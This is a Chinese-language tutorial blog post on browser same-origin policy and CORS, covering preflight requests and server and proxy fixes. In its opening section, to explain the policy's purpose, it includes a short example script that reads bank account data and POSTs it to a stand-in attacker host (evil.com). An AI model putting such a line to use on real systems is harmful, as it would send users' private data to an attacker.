---
title: 跨域
date: 2025-09-01 18:45:17
tags: [前端, 网络安全, CORS, 跨域]
categories: 前端开发
---


## 引言

在项目开发中，我们经常遇到这样的困扰：用Postman测试API接口一切正常，但在浏览器中却出现了OPTIONS 403错误，提示跨域问题。今天我们就来深入了解跨域的原理和解决方案。

## 1. 什么是跨域

### 1.1 同源策略

同源策略是浏览器的一个重要安全机制，它限制了一个源（origin）的文档或脚本如何能与另一个源的资源进行交互。

**同源的定义：**

- 协议相同（http/https）
- 域名相同
- 端口相同

**同源策略的安全目的：**

1. **防止CSRF攻击**：阻止恶意网站向用户已登录的网站发送请求
2. **保护用户隐私**：防止恶意脚本读取其他网站的敏感数据
3. **防止XSS攻击扩散**：限制恶意脚本跨域访问资源
4. **保护API安全**：防止未授权的跨域API调用

```javascript
// 恶意网站想要获取用户银行信息的例子
// 如果没有同源策略，恶意网站可以这样做：
fetch('https://bank.com/account-info')  // 被同源策略阻止
  .then(data => {
    // 窃取用户银行信息发送到恶意服务器
    fetch('https://evil.com/steal', { 
      method: 'POST', 
      body: data 
    });
  });
```

### 1.2 跨域场景示例

```javascript
// 当前页面：https://www.example.com:8080
// 以下请求都属于跨域：
fetch('http://www.example.com:8080/api')   // 协议不同
fetch('https://api.example.com:8080/data') // 域名不同  
fetch('https://www.example.com:9000/api')  // 端口不同
```

### 1.3 解决特定跨域场景的方法

#### 场景1：协议不同（http vs https）

```javascript
// 问题：https://www.example.com:8080 访问 http://www.example.com:8080/api

// 解决方案：
// 1. 统一使用HTTPS（推荐）
fetch('https://www.example.com:8080/api')

// 2. 服务端同时支持HTTP和HTTPS，配置重定向
// Nginx配置示例：
/*
server {
    listen 80;
    server_name www.example.com;
    return 301 https://$server_name$request_uri;
}
*/
```

#### 场景2：域名不同

```javascript
// 问题：https://www.example.com:8080 访问 https://api.example.com:8080/data

// 解决方案1：服务端配置CORS
// 在api.example.com服务端添加：
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://www.example.com:8080');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// 解决方案2：使用代理
// 在www.example.com的服务器配置反向代理
/*
location /api/ {
    proxy_pass https://api.example.com:8080/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
*/

// 前端调用代理地址
fetch('/api/data')  // 实际请求到api.example.com
```

#### 场景3：端口不同

```javascript
// 问题：https://www.example.com:8080 访问 https://www.example.com:9000/api

// 解决方案1：统一端口（生产环境推荐）
// 使用Nginx或负载均衡器统一到80/443端口
/*
upstream backend {
    server localhost:9000;
}

server {
    listen 8080;
    server_name www.example.com;
    
    location /api/ {
        proxy_pass http://backend/;
    }
}
*/

// 解决方案2：服务端配置CORS
// 在9000端口的服务配置：
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://www.example.com:8080');
  // ...其他CORS配置
  next();
});

// 解决方案3：开发环境使用代理
// webpack.config.js
module.exports = {
  devServer: {
    port: 8080,
    proxy: {
      '/api': {
        target: 'https://www.example.com:9000',
        changeOrigin: true
      }
    }
  }
};
```

## 2. 为什么Postman可以，浏览器不行？

### 2.1 Postman的特点

- Postman是独立的HTTP客户端工具
- 不受浏览器同源策略限制
- 直接发送HTTP请求，无需预检

### 2.2 浏览器的限制

- 严格执行同源策略
- 复杂请求需要预检（OPTIONS请求）
- 对跨域资源访问有严格控制

## 3. CORS预检请求详解

### 3.1 什么是预检请求

浏览器在发送某些跨域请求前，会先发送OPTIONS请求进行预检：

```http
OPTIONS /api/user HTTP/1.1
Host: api.example.com
Origin: https://www.mysite.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

### 3.2 触发预检的条件

#### 简单请求（不触发预检）

满足以下所有条件的请求为简单请求：

**允许的方法：**

- GET
- HEAD  
- POST

**允许的Content-Type：**

- application/x-www-form-urlencoded
- multipart/form-data
- text/plain

**允许的请求头：**

- Accept
- Accept-Language
- Content-Language
- Content-Type（仅限上述三种值）

#### 复杂请求（触发预检）

不满足简单请求条件的都会触发预检，包括：

**HTTP方法：**

- PUT
- DELETE
- PATCH
- CONNECT
- OPTIONS
- TRACE
- 以及其他自定义方法

**Content-Type：**

- application/json
- application/xml
- text/xml
- 等其他类型

**自定义请求头：**

- Authorization
- X-Requested-With
- 任何自定义头部（如X-Custom-Header）

```javascript
// 简单请求示例 - 不触发预检
fetch('https://api.example.com/data', {
  method: 'GET'
});

fetch('https://api.example.com/form', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'name=John&age=30'
});

// 复杂请求示例 - 触发预检
fetch('https://api.example.com/user', {
  method: 'PUT',  // 非简单方法
  headers: {
    'Content-Type': 'application/json'  // 非简单Content-Type
  },
  body: JSON.stringify({name: 'John'})
});

fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer token'  // 自定义头部
  }
});
```

## 4. 跨域解决方案

### 4.1 服务端配置CORS

#### Node.js + Express示例

```javascript
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});
```

#### Spring Boot示例

```java
@CrossOrigin(origins = "https://www.example.com")
@RestController
public class ApiController {
    // 控制器方法
}
```

### 4.2 代理解决方案

#### 开发环境 - Webpack DevServer

```javascript
// webpack.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        pathRewrite: {
          '^/api': ''
        }
      }
    }
  }
};
```

#### 生产环境 - Nginx反向代理

```nginx
server {
    listen 80;
    server_name www.example.com;
    
    location /api/ {
        proxy_pass https://api.backend.com/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```



## 5. 最佳实践和安全建议

### 5.1 生产环境配置

```javascript
// 不要使用通配符
res.header('Access-Control-Allow-Origin', 'https://trusted-domain.com');

// 明确指定允许的方法和头部
res.header('Access-Control-Allow-Methods', 'GET, POST');
res.header('Access-Control-Allow-Headers', 'Content-Type');
```

### 5.2 前端处理跨域错误

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .catch(error => {
    if (error.message.includes('CORS')) {
      console.error('跨域请求被阻止:', error);
      // 提示用户或使用备用方案
    }
  });
```

## 6. 调试跨域问题的方法

### 6.1 浏览器开发者工具

- 查看Network面板的OPTIONS请求
- 检查Response Headers中的CORS相关字段
- 查看Console中的错误信息

### 6.2 常用调试技巧

```javascript
// 检查请求是否为简单请求
const isSimpleRequest = (method, headers) => {
  const simpleMethods = ['GET', 'HEAD', 'POST'];
  const simpleHeaders = ['accept', 'accept-language', 'content-language', 'content-type'];
  
  return simpleMethods.includes(method) && 
         Object.keys(headers).every(h => simpleHeaders.includes(h.toLowerCase()));
};
```

## 7. 总结

跨域问题是前端开发中的常见挑战，理解其原理有助于我们选择合适的解决方案：

1. **开发阶段**：使用代理服务器
2. **生产环境**：服务端正确配置CORS
3. **安全第一**：避免使用通配符，明确指定允许的源

记住，跨域限制是浏览器的安全机制，我们应该在保证安全的前提下解决跨域问题。

## 参考资料

- [MDN - CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
- [RFC 6454 - The Web Origin Concept](https://tools.ietf.org/html/rfc6454)
